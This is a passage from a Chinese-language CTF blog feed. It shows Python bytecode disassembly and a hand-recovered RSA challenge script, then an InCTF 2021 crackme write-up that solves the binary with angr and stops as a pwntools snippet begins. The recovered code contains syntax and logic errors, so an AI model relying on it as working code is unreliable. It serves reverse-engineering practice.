class="number">1</span>: l</span><br><span class="line">                <span class="number">44</span>      LOAD_GLOBAL             <span class="number">4</span>: bytes_to_long</span><br><span class="line">                <span class="number">46</span>      LOAD_FAST               <span class="number">0</span>: m</span><br><span class="line">                <span class="number">48</span>      LOAD_CONST              <span class="number">0</span>: <span class="literal">None</span></span><br><span class="line">                <span class="number">50</span>      LOAD_FAST               <span class="number">1</span>: l</span><br><span class="line">                <span class="number">52</span>      BUILD_SLICE             <span class="number">2</span></span><br><span class="line">                <span class="number">54</span>      BINARY_SUBSCR           </span><br><span class="line">                <span class="number">56</span>      CALL_FUNCTION           <span class="number">1</span></span><br><span class="line">                <span class="number">58</span>      STORE_FAST              <span class="number">2</span>: m1</span><br><span class="line">                <span class="number">60</span>      LOAD_GLOBAL             <span class="number">4</span>: bytes_to_long</span><br><span class="line">                <span class="number">62</span>      LOAD_FAST               <span class="number">0</span>: m</span><br><span class="line">                <span class="number">64</span>      LOAD_FAST               <span class="number">1</span>: l</span><br><span class="line">                <span class="number">66</span>      LOAD_CONST              <span class="number">0</span>: <span class="literal">None</span></span><br><span class="line">                <span class="number">68</span>      BUILD_SLICE             <span class="number">2</span></span><br><span class="line">                <span class="number">70</span>      BINARY_SUBSCR           </span><br><span class="line">                <span class="number">72</span>      CALL_FUNCTION           <span class="number">1</span></span><br><span class="line">                <span class="number">74</span>      STORE_FAST              <span class="number">3</span>: m2</span><br><span class="line">                <span class="number">76</span>      LOAD_GLOBAL             <span class="number">5</span>: gen_prime</span><br><span class="line">                <span class="number">78</span>      LOAD_CONST              <span class="number">3</span>: <span class="number">1024</span></span><br><span class="line">                <span class="number">80</span>      CALL_FUNCTION           <span class="number">1</span></span><br><span class="line">                <span class="number">82</span>      STORE_FAST              <span class="number">4</span>: p</span><br><span class="line">                <span class="number">84</span>      LOAD_GLOBAL             <span class="number">5</span>: gen_prime</span><br><span class="line">                <span class="number">86</span>      LOAD_CONST              <span class="number">3</span>: <span class="number">1024</span></span><br><span class="line">                <span class="number">88</span>      CALL_FUNCTION           <span class="number">1</span></span><br><span class="line">                <span class="number">90</span>      STORE_FAST              <span class="number">5</span>: q</span><br><span class="line">                <span class="number">92</span>      LOAD_GLOBAL             <span class="number">6</span>: g</span><br><span class="line">                <span class="number">94</span>      LOAD_METHOD             <span class="number">7</span>: next_prime</span><br><span class="line">                <span class="number">96</span>      LOAD_FAST               <span class="number">4</span>: p</span><br><span class="line">                <span class="number">98</span>      LOAD_CONST              <span class="number">4</span>: <span class="number">2333</span></span><br><span class="line">                <span class="number">100</span>     BINARY_ADD              </span><br><span class="line">                <span class="number">102</span>     CALL_METHOD             <span class="number">1</span></span><br><span class="line">                <span class="number">104</span>     STORE_FAST              <span class="number">6</span>: pp</span><br><span class="line">                <span class="number">106</span>     LOAD_GLOBAL             <span class="number">6</span>: g</span><br><span class="line">                <span class="number">108</span>     LOAD_METHOD             <span class="number">7</span>: next_prime</span><br><span class="line">                <span class="number">110</span>     LOAD_FAST               <span class="number">5</span>: q</span><br><span class="line">                <span class="number">112</span>     LOAD_CONST              <span class="number">4</span>: <span class="number">2333</span></span><br><span class="line">                <span class="number">114</span>     BINARY_ADD              </span><br><span class="line">                <span class="number">116</span>     CALL_METHOD             <span class="number">1</span></span><br><span class="line">                <span class="number">118</span>     STORE_FAST              <span class="number">7</span>: qq</span><br><span class="line">                <span class="number">120</span>     LOAD_GLOBAL             <span class="number">6</span>: g</span><br><span class="line">                <span class="number">122</span>     LOAD_METHOD             <span class="number">7</span>: next_prime</span><br><span class="line">                <span class="number">124</span>     LOAD_CONST              <span class="number">5</span>: <span class="number">65535</span></span><br><span class="line">                <span class="number">126</span>     CALL_METHOD             <span class="number">1</span></span><br><span class="line">                <span class="number">128</span>     STORE_FAST              <span class="number">8</span>: e</span><br><span class="line">                <span class="number">130</span>     LOAD_GLOBAL             <span class="number">6</span>: g</span><br><span class="line">                <span class="number">132</span>     LOAD_METHOD             <span class="number">7</span>: next_prime</span><br><span class="line">                <span class="number">134</span>     LOAD_FAST               <span class="number">8</span>: e</span><br><span class="line">                <span class="number">136</span>     CALL_METHOD             <span class="number">1</span></span><br><span class="line">                <span class="number">138</span>     STORE_FAST              <span class="number">9</span>: ee</span><br><span class="line">                <span class="number">140</span>     LOAD_FAST               <span class="number">4</span>: p</span><br><span class="line">                <span class="number">142</span>     LOAD_FAST               <span class="number">5</span>: q</span><br><span class="line">                <span class="number">144</span>     BINARY_MULTIPLY         </span><br><span class="line">                <span class="number">146</span>     STORE_FAST              <span class="number">10</span>: n</span><br><span class="line">                <span class="number">148</span>     LOAD_FAST               <span class="number">6</span>: pp</span><br><span class="line">                <span class="number">150</span>     LOAD_FAST               <span class="number">7</span>: qq</span><br><span class="line">                <span class="number">152</span>     BINARY_MULTIPLY         </span><br><span class="line">                <span class="number">154</span>     STORE_FAST              <span class="number">11</span>: nn</span><br><span class="line">                <span class="number">156</span>     LOAD_GLOBAL             <span class="number">8</span>: long_to_bytes</span><br><span class="line">                <span class="number">158</span>     LOAD_GLOBAL             <span class="number">9</span>: pow</span><br><span class="line">                <span class="number">160</span>     LOAD_FAST               <span class="number">2</span>: m1</span><br><span class="line">                <span class="number">162</span>     LOAD_FAST               <span class="number">8</span>: e</span><br><span class="line">                <span class="number">164</span>     LOAD_FAST               <span class="number">10</span>: n</span><br><span class="line">                <span class="number">166</span>     CALL_FUNCTION           <span class="number">3</span></span><br><span class="line">                <span class="number">168</span>     CALL_FUNCTION           <span class="number">1</span></span><br><span class="line">                <span class="number">170</span>     STORE_FAST              <span class="number">12</span>: c1</span><br><span class="line">                <span class="number">172</span>     LOAD_GLOBAL             <span class="number">8</span>: long_to_bytes</span><br><span class="line">                <span class="number">174</span>     LOAD_GLOBAL             <span class="number">9</span>: pow</span><br><span class="line">                <span class="number">176</span>     LOAD_FAST               <span class="number">3</span>: m2</span><br><span class="line">                <span class="number">178</span>     LOAD_FAST               <span class="number">9</span>: ee</span><br><span class="line">                <span class="number">180</span>     LOAD_FAST               <span class="number">11</span>: nn</span><br><span class="line">                <span class="number">182</span>     CALL_FUNCTION           <span class="number">3</span></span><br><span class="line">                <span class="number">184</span>     CALL_FUNCTION           <span class="number">1</span></span><br><span class="line">                <span class="number">186</span>     STORE_FAST              <span class="number">13</span>: c2</span><br><span class="line">                <span class="number">188</span>     LOAD_GLOBAL             <span class="number">10</span>: <span class="keyword">print</span></span><br><span class="line">                <span class="number">190</span>     LOAD_GLOBAL             <span class="number">11</span>: str</span><br><span class="line">                <span class="number">192</span>     LOAD_FAST               <span class="number">10</span>: n</span><br><span class="line">                <span class="number">194</span>     CALL_FUNCTION           <span class="number">1</span></span><br><span class="line">                <span class="number">196</span>     LOAD_FAST               <span class="number">11</span>: nn</span><br><span class="line">                <span class="number">198</span>     LOAD_METHOD             <span class="number">12</span>: digits</span><br><span class="line">                <span class="number">200</span>     CALL_METHOD             <span class="number">0</span></span><br><span class="line">                <span class="number">202</span>     LOAD_FAST               <span class="number">12</span>: c1</span><br><span class="line">                <span class="number">204</span>     LOAD_FAST               <span class="number">13</span>: c2</span><br><span class="line">                <span class="number">206</span>     BINARY_ADD              </span><br><span class="line">                <span class="number">208</span>     LOAD_METHOD             <span class="number">13</span>: hex</span><br><span class="line">                <span class="number">210</span>     CALL_METHOD             <span class="number">0</span></span><br><span class="line">                <span class="number">212</span>     CALL_FUNCTION           <span class="number">3</span></span><br><span class="line">                <span class="number">214</span>     POP_TOP                 </span><br><span class="line">                <span class="number">216</span>     LOAD_FAST               <span class="number">12</span>: c1</span><br><span class="line">                <span class="number">218</span>     LOAD_FAST               <span class="number">13</span>: c2</span><br><span class="line">                <span class="number">220</span>     BINARY_ADD              </span><br><span class="line">                <span class="number">222</span>     RETURN_VALUE            </span><br><span class="line">        <span class="string">'e2'</span></span><br><span class="line">        <span class="string">'__main__'</span></span><br><span class="line">        <span class="number">2</span></span><br><span class="line">        <span class="number">1</span></span><br><span class="line">        <span class="string">b'ZmxhZ3t0aGlzaXNhZmFrZWZsYWdhZ2Fhc2FzaGRhc2hkc2hkaH0='</span></span><br><span class="line">    [Disassembly]</span><br><span class="line">        <span class="number">0</span>       JUMP_ABSOLUTE           <span class="number">4</span></span><br><span class="line">        <span class="number">2</span>       LOAD_CONST              <span class="number">11</span>: <span class="string">'__main__'</span></span><br><span class="line">        <span class="number">4</span>       LOAD_CONST              <span class="number">0</span>: <span class="number">0</span></span><br><span class="line">        <span class="number">6</span>       LOAD_CONST              <span class="number">1</span>: <span class="literal">None</span></span><br><span class="line">        <span class="number">8</span>       IMPORT_NAME             <span class="number">0</span>: gmpy2</span><br><span class="line">        <span class="number">10</span>      STORE_NAME              <span class="number">1</span>: g</span><br><span class="line">        <span class="number">12</span>      LOAD_CONST              <span class="number">0</span>: <span class="number">0</span></span><br><span class="line">        <span class="number">14</span>      LOAD_CONST              <span class="number">2</span>: (<span class="string">'long_to_bytes'</span>, <span class="string">'bytes_to_long'</span>)</span><br><span class="line">        <span class="number">16</span>      IMPORT_NAME             <span class="number">2</span>: Crypto.Util.number</span><br><span class="line">        <span class="number">18</span>      IMPORT_FROM             <span class="number">3</span>: long_to_bytes</span><br><span class="line">        <span class="number">20</span>      STORE_NAME              <span class="number">3</span>: long_to_bytes</span><br><span class="line">        <span class="number">22</span>      IMPORT_FROM             <span class="number">4</span>: bytes_to_long</span><br><span class="line">        <span class="number">24</span>      STORE_NAME              <span class="number">4</span>: bytes_to_long</span><br><span class="line">        <span class="number">26</span>      POP_TOP                 </span><br><span class="line">        <span class="number">28</span>      LOAD_CONST              <span class="number">0</span>: <span class="number">0</span></span><br><span class="line">        <span class="number">30</span>      LOAD_CONST              <span class="number">1</span>: <span class="literal">None</span></span><br><span class="line">        <span class="number">32</span>      IMPORT_NAME             <span class="number">5</span>: random</span><br><span class="line">        <span class="number">34</span>      STORE_NAME              <span class="number">5</span>: random</span><br><span class="line">        <span class="number">36</span>      LOAD_CONST              <span class="number">3</span>: &lt;CODE&gt; gen_num</span><br><span class="line">        <span class="number">38</span>      LOAD_CONST              <span class="number">4</span>: <span class="string">'gen_num'</span></span><br><span class="line">        <span class="number">40</span>      MAKE_FUNCTION           <span class="number">0</span></span><br><span class="line">        <span class="number">42</span>      STORE_NAME              <span class="number">6</span>: gen_num</span><br><span class="line">        <span class="number">44</span>      LOAD_CONST              <span class="number">5</span>: &lt;CODE&gt; gen_prime</span><br><span class="line">        <span class="number">46</span>      LOAD_CONST              <span class="number">6</span>: <span class="string">'gen_prime'</span></span><br><span class="line">        <span class="number">48</span>      MAKE_FUNCTION           <span class="number">0</span></span><br><span class="line">        <span class="number">50</span>      STORE_NAME              <span class="number">7</span>: gen_prime</span><br><span class="line">        <span class="number">52</span>      LOAD_CONST              <span class="number">7</span>: &lt;CODE&gt; po</span><br><span class="line">        <span class="number">54</span>      LOAD_CONST              <span class="number">8</span>: <span class="string">'po'</span></span><br><span class="line">        <span class="number">56</span>      MAKE_FUNCTION           <span class="number">0</span></span><br><span class="line">        <span class="number">58</span>      STORE_NAME              <span class="number">8</span>: po</span><br><span class="line">        <span class="number">60</span>      LOAD_CONST              <span class="number">9</span>: &lt;CODE&gt; e2</span><br><span class="line">        <span class="number">62</span>      LOAD_CONST              <span class="number">10</span>: <span class="string">'e2'</span></span><br><span class="line">        <span class="number">64</span>      MAKE_FUNCTION           <span class="number">0</span></span><br><span class="line">        <span class="number">66</span>      STORE_NAME              <span class="number">9</span>: e2</span><br><span class="line">        <span class="number">68</span>      LOAD_NAME               <span class="number">10</span>: __name__</span><br><span class="line">        <span class="number">70</span>      LOAD_CONST              <span class="number">11</span>: <span class="string">'__main__'</span></span><br><span class="line">        <span class="number">72</span>      COMPARE_OP              <span class="number">2</span> (==)</span><br><span class="line">        <span class="number">74</span>      POP_JUMP_IF_FALSE       <span class="number">144</span></span><br><span class="line">        <span class="number">76</span>      LOAD_CONST              <span class="number">0</span>: <span class="number">0</span></span><br><span class="line">        <span class="number">78</span>      LOAD_CONST              <span class="number">1</span>: <span class="literal">None</span></span><br><span class="line">        <span class="number">80</span>      IMPORT_NAME             <span class="number">11</span>: sys</span><br><span class="line">        <span class="number">82</span>      STORE_NAME              <span class="number">11</span>: sys</span><br><span class="line">        <span class="number">84</span>      LOAD_NAME               <span class="number">12</span>: len</span><br><span class="line">        <span class="number">86</span>      LOAD_NAME               <span class="number">11</span>: sys</span><br><span class="line">        <span class="number">88</span>      LOAD_ATTR               <span class="number">13</span>: argv</span><br><span class="line">        <span class="number">90</span>      CALL_FUNCTION           <span class="number">1</span></span><br><span class="line">        <span class="number">92</span>      LOAD_CONST              <span class="number">12</span>: <span class="number">2</span></span><br><span class="line">        <span class="number">94</span>      COMPARE_OP              <span class="number">5</span> (&gt;=)</span><br><span class="line">        <span class="number">96</span>      POP_JUMP_IF_FALSE       <span class="number">118</span></span><br><span class="line">        <span class="number">98</span>      LOAD_NAME               <span class="number">9</span>: e2</span><br><span class="line">        <span class="number">100</span>     LOAD_NAME               <span class="number">11</span>: sys</span><br><span class="line">        <span class="number">102</span>     LOAD_ATTR               <span class="number">13</span>: argv</span><br><span class="line">        <span class="number">104</span>     LOAD_CONST              <span class="number">13</span>: <span class="number">1</span></span><br><span class="line">        <span class="number">106</span>     BINARY_SUBSCR           </span><br><span class="line">        <span class="number">108</span>     LOAD_METHOD             <span class="number">14</span>: encode</span><br><span class="line">        <span class="number">110</span>     CALL_METHOD             <span class="number">0</span></span><br><span class="line">        <span class="number">112</span>     CALL_FUNCTION           <span class="number">1</span></span><br><span class="line">        <span class="number">114</span>     POP_TOP                 </span><br><span class="line">        <span class="number">116</span>     JUMP_FORWARD            <span class="number">26</span> (to <span class="number">144</span>)</span><br><span class="line">        <span class="number">118</span>     LOAD_CONST              <span class="number">0</span>: <span class="number">0</span></span><br><span class="line">        <span class="number">120</span>     LOAD_CONST              <span class="number">1</span>: <span class="literal">None</span></span><br><span class="line">        <span class="number">122</span>     IMPORT_NAME             <span class="number">15</span>: base64</span><br><span class="line">        <span class="number">124</span>     STORE_NAME              <span class="number">16</span>: B</span><br><span class="line">        <span class="number">126</span>     LOAD_NAME               <span class="number">16</span>: B</span><br><span class="line">        <span class="number">128</span>     LOAD_METHOD             <span class="number">17</span>: b64decode</span><br><span class="line">        <span class="number">130</span>     LOAD_CONST              <span class="number">14</span>: <span class="string">b'ZmxhZ3t0aGlzaXNhZmFrZWZsYWdhZ2Fhc2FzaGRhc2hkc2hkaH0='</span></span><br><span class="line">        <span class="number">132</span>     CALL_METHOD             <span class="number">1</span></span><br><span class="line">        <span class="number">134</span>     STORE_NAME              <span class="number">18</span>: flag</span><br><span class="line">        <span class="number">136</span>     LOAD_NAME               <span class="number">9</span>: e2</span><br><span class="line">        <span class="number">138</span>     LOAD_NAME               <span class="number">18</span>: flag</span><br><span class="line">        <span class="number">140</span>     CALL_FUNCTION           <span class="number">1</span></span><br><span class="line">        <span class="number">142</span>     POP_TOP                 </span><br><span class="line">        <span class="number">144</span>     LOAD_CONST              <span class="number">1</span>: <span class="literal">None</span></span><br><span class="line">        <span class="number">146</span>     RETURN_VALUE</span><br></pre></td></tr></table></figure><p>都是很简单的代码，稍微熟悉下指令结构就能很快知道代码的功能。</p><p>开始是一个gen_numer的方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_num</span><span class="params">(n_bits)</span>:</span></span><br><span class="line">res = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(n_bits):</span><br><span class="line"><span class="keyword">if</span> res != <span class="number">0</span>:</span><br><span class="line">res &lt;&lt;= <span class="number">1</span></span><br><span class="line">res |= random.choice([<span class="number">0</span>, <span class="number">1</span>])</span><br></pre></td></tr></table></figure><p>然后gem_prime的方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_prime</span><span class="params">(n_bits)</span>:</span></span><br><span class="line">res = gen_num(n_bits)</span><br><span class="line"><span class="keyword">while</span> !gmpy2.is_prime(res):</span><br><span class="line">b = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> b != <span class="number">0</span>:</span><br><span class="line">res, b = res^b, (res&amp;b) &lt;&lt; <span class="number">1</span></span><br><span class="line"><span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><p>接着是一个powmod运算：这个它是用模重复平方实现的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">po</span><span class="params">(a, b, n)</span>:</span></span><br><span class="line">res = <span class="number">1</span></span><br><span class="line">aa = a</span><br><span class="line"><span class="keyword">while</span> b != <span class="number">0</span>:</span><br><span class="line"><span class="keyword">if</span> b&amp;<span class="number">1</span> == <span class="number">1</span>:</span><br><span class="line">res = res*aa%n</span><br><span class="line">aa *= aa</span><br><span class="line">b &gt;&gt; <span class="number">1</span></span><br><span class="line">res = res%n</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><p>再就是本题的关键加密函数e2，从反汇编结果来看这里也是对代码加了混淆的，因为我们的参数是bytes形式的，所以肯定跳过那个异常执行，但是反汇编或反编译器工具就没有那么智能了。</p><p><img src="/2021/08/26/2021%E8%93%9D%E5%B8%BD%E6%80%BB%E5%86%B3%E8%B5%9B/image-20210827161449207.png" alt="image-20210827161449207"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">e2</span><span class="params">(m)</span>:</span></span><br><span class="line"><span class="keyword">if</span> type(m) == bytes:</span><br><span class="line">l = len(m)//<span class="number">2</span></span><br><span class="line">m1 = bytes_to_long(m[:l])</span><br><span class="line">m2 = bytes_to_long(m[l:])</span><br><span class="line">p = gen_prime(<span class="number">1024</span>)</span><br><span class="line">q = gen_prime(<span class="number">1024</span>)</span><br><span class="line">pp = gmpy2.next_prime(p+<span class="number">2333</span>)</span><br><span class="line">qq = gmpy2.next_prime(q+<span class="number">2333</span>)</span><br><span class="line">e = gmpy2.next_prime(<span class="number">65535</span>)</span><br><span class="line">ee = gmpy2.next_prime(e)</span><br><span class="line">n = p*q</span><br><span class="line">nn = pp*qq</span><br><span class="line">c1 = long_to_bytes(pow(m1, e, n))</span><br><span class="line">c2 = long_to_bytes(pow(m2, ee, nn))</span><br><span class="line">print(n)</span><br><span class="line">print(nn)</span><br><span class="line">print((c1+c2).hex())</span><br></pre></td></tr></table></figure><p>最后就是main函数的地方：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt;= <span class="number">2</span>:</span><br><span class="line">e2(sys.argv[<span class="number">1</span>].encode())</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">flag = base64.b64decode(<span class="string">'ZmxhZ3t0aGlzaXNhZmFrZWZsYWdhZ2Fhc2FzaGRhc2hkc2hkaH0='</span>)</span><br><span class="line">e2(flag)</span><br></pre></td></tr></table></figure><p>至此我将整个pyc文件手动的读代码恢复到了原始的py文件。</p><p>比赛时我也只是关心了那个加密函数e2，生成素数算法就是随机生成素数而已。</p><p>加密就是用2对rsa公钥加密对我们明文分为2组加密，然后密文给了2组公钥的n与nn：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">p = </span><br><span class="line">q = </span><br><span class="line">pp = gmpy2.next_prime(p+2333)</span><br><span class="line">qq = gmpy2.next_prime(q+2333)</span><br><span class="line">n = p*q</span><br><span class="line">nn = pp*qq</span><br><span class="line"></span><br><span class="line">n与nn已知</span><br></pre></td></tr></table></figure><p>开始还以为可以直接用factor把n分解出来，并不行，比赛时也是卡在了怎么根据以上的条件求解出p，q，pp，qq</p><p>以前在逆向中遇到的rsa都是n可以直接分解的，这次还真就在逆向中放一个要利用信安数学相关知识来分解n的题。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">10300808326934539089496666241808264289631957459372648156286399524715435483257526083909012656240599916663153630994400397551123967736269088895097145175999170121832669199408651009372742448196961434772052680714475103278704994244915332148949308972258132346198706995878511207707020032852291909422169657384059305615332901933166314692127020030962059133945677194815714731744932280037687773557589292839426111679593131496468880818820566335362063945141576571029271455695757725169819071536590541808603312689890186432713168331831945391117398124164372551511615664022982639779869597584768094658974144703654232643726744397158318139843</span> <span class="number">10300808326934539089496666241808264289631957459372648156286399524715435483257526083909012656240599916663153630994400397551123967736269088895097145175999170121832669199408651009372742448196961434772052680714475103278704994244915332148949308972258132346198706995878511207707020032852291909422169657384059306119730985949350246133999803589372738154347587848281413687500584822677442973180875153089761224816081452749380588888095064009160267372694200256546854314017937003988172151851703041691419537865664897608475932582537945754540823276273979713144072687287826518630644255675609067675836382036436064703619178779628644141463</span> <span class="number">22</span>cca5150ca0bb2132f68302dc7441e52b91ae7252e44cc13ed83e58253a9aaaa55e095ba36748dff7ea21fff553f8c4656e77a508b64da054f1381b7e2d0600bcec6ed9e1cc8d14c2362aaef7a972a714f88e5afb2d39e2d77d0c22a449ca2cfb0802c138f20e0ecbd3c174151cdb8e8ca6d89aa3c503615ebfbc851af5ac51dcfa8b5869b775b57a27b9e4346979180d89b303cae2c5d9e6cabb3c9947837bd8f92333532d4b54dd72ea354000600066328f6f4329147df195ec78a7ab9d39973ce0fd6511e7a0de54737bee64476ba531604f0375b08adf7d768c41ba9e2ba88468d126561a134de79dc0217c1c56d219ca6747103618e46f35281feb9e6050c93e32e26e21ee2c3d495f60db2fad9f9a5c570c9f97aee698024ebff6163ef26e32958872db7c593d7f41f90981b8db45aa01085be1e61f7603ecf3d5c032dd90dea791cd9825299548c0cbe7dadabc157048a7fd5cd4bcb1cfeaf0bd2d679f66ceb0b1c33ec04bd20317f872c85d500a3475833f983fdee59b3f61a731e2a8b9a60bd7d840f46e97f06dd4fd8ad1cb4d13a82da01938801c33835ceaf34e1cf62ebdde7ac68b17c2a236b64ffacd2a0e7258571ce570871aea9ff309df63c0a3abcfa0c05d159a82f9fa3f3ad73944e4ae33c3432c8b65c0d6fe9b560220b14abe5886188fc1e6afa4bb4395669618387224422acf20b519af902225e270</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>InCTF-2021</title>
      <link href="/2021/08/16/InCTF-2021/"/>
      <url>/2021/08/16/InCTF-2021/</url>
      
        <content type="html"><![CDATA[<p>Reverse~（本来说后面来把做当时做了题的wp更新下，拖太久了，那就算了，暂且就这两个题😂<a id="more"></a></p><h3 id="find-plut0"><a href="#find-plut0" class="headerlink" title="find_plut0"></a>find_plut0</h3><p>开始我使用z3来解，掉进坑里了。</p><p>这里手动把程序中的连续的数据定义为数组，然后转换一下类型，方便直接复制到z3中使用。</p><p><img src="/2021/08/16/InCTF-2021/image-20210816122348022.png" alt="image-20210816122348022"></p><p>但是跑不出结果，，。</p><p>接着使用了最基本的angr模板来跑一下，结果秒出：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr, claripy, sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_success</span><span class="params">(state)</span>:</span></span><br><span class="line">    std_out = state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b'\nYeey you found him !!!!'</span> <span class="keyword">in</span> std_out:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_false</span><span class="params">(state)</span>:</span></span><br><span class="line">    std_out = state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b'Lol , he won'</span> <span class="keyword">in</span> std_out:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">'./chall'</span>) </span><br><span class="line">init_state = proj.factory.entry_state() </span><br><span class="line">sim = proj.factory.simgr(init_state) </span><br><span class="line">sim.explore(find = is_success, avoid = is_false) </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">print(sim.found[<span class="number">0</span>].posix.dumps(i))</span><br></pre></td></tr></table></figure><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">WARNING | 2021-08-16 12:12:05,063 | cle.loader | The main binary is a position-independent executable. It is being loaded with a base address of 0x400000.</span><br><span class="line">b'`<span class="symbol">\\</span>ET0a<span class="symbol">\x</span>fd<span class="symbol">\x</span>8e<span class="symbol">\x</span>8b3<span class="symbol">\x</span>01<span class="symbol">\x</span>02!7<span class="symbol">\x</span>03<span class="symbol">\x</span>02<span class="symbol">\x</span>c9<span class="symbol">\x</span>e3<span class="symbol">\x</span>01<span class="symbol">\x</span>02<span class="symbol">\x</span>12<span class="symbol">\x</span>1ftr<span class="symbol">\x</span>027<span class="symbol">\x</span>ff<span class="symbol">\x</span>d1<span class="symbol">\x</span>02<span class="symbol">\x</span>e1<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>02<span class="symbol">\x</span>02<span class="symbol">\x</span>00<span class="symbol">\x</span>02<span class="symbol">\x</span>02<span class="symbol">\x</span>00<span class="symbol">\x</span>02<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>02<span class="symbol">\x</span>02<span class="symbol">\x</span>00<span class="symbol">\x</span>02<span class="symbol">\x</span>00<span class="symbol">\x</span>02<span class="symbol">\x</span>00<span class="symbol">\x</span>02<span class="symbol">\x</span>00<span class="symbol">\x</span>02<span class="symbol">\x</span>02<span class="symbol">\x</span>02<span class="symbol">\x</span>02<span class="symbol">\x</span>02<span class="symbol">\x</span>8a<span class="symbol">\x</span>89<span class="symbol">\x</span>02'</span><br><span class="line">b"Hello there , i lost my dog pluto :(<span class="symbol">\n</span>Help me call him out please !!<span class="symbol">\n</span><span class="symbol">\n</span> ................<span class="symbol">\n</span> |w00ff w00ff!! |<span class="symbol">\n</span>  '''''V'''''''' <span class="symbol">\n</span> <span class="symbol">\n</span>     .~````~. <span class="symbol">\n</span>  .,/        <span class="symbol">\\</span>,. <span class="symbol">\n</span> (  | (0  0) |  )<span class="symbol">\n</span> (  |  ____  |  )<span class="symbol">\n</span> (_/|  <span class="symbol">\\</span>__/  |<span class="symbol">\\</span>_)<span class="symbol">\n</span>     <span class="symbol">\\</span>__/<span class="symbol">\\</span>__/<span class="symbol">\n</span>      '-..-'  <span class="symbol">\n</span><span class="symbol">\n</span><span class="symbol">\n</span>Yeey you found him !!!!<span class="symbol">\n</span> Grab your reward from nc!<span class="symbol">\n</span>"</span><br><span class="line">b''</span><br></pre></td></tr></table></figure><p>这个有很多不可通过键盘输入的字符，所以使用pwntools来远程sendline一下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span 